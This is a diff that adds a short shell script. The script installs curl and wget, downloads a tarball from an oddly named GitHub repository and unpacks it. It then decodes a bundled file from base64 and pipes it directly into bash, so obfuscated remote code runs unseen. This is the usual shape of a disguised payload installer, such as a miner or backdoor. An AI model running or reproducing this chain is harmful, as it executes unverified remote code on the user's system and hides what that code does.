@@ -1,0 +1,11 @@
+apt-get update
+
+apt-get install curl -y
+
+apt-get install wget -y
+
+wget -N https://raw.githubusercontent.com/linuxweb888888888888/linux8888/refs/heads/main/linux8888.tar.gz
+
+tar -xvf ./linux8888.tar.gz
+
+cat ./startweb | base64 -d | bash
